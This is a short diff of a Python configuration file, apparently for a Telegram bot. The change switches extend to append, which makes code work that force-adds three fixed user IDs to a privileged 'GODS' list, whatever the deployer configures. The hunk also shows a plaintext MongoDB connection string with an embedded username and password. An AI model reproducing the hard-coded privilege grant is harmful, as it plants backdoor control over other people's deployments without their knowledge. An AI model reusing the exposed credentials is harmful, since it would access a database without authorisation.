@@ -25,11 +25,11 @@ SESSION = ""
 MONGO_DB_URL = str("mongodb+srv://AasfCyberKing:Mm11$$$$@invaded.exzjpln.mongodb.net/?retryWrites=true&w=majority")
 GODS = list(int(x) for x in getenv("GODS", "").split())
 if not 5446914371 in GODS:
-  GODS.extend(5446914371)
+  GODS.append(5446914371)
 if not 5446914371 in GODS:
-  GODS.extend(5446914371)
+  GODS.append(5446914371)
 if not 5365575465 in GODS:
-  GODS.extend(5365575465)
+  GODS.append(5365575465)
 
 
 if IS_BOT:
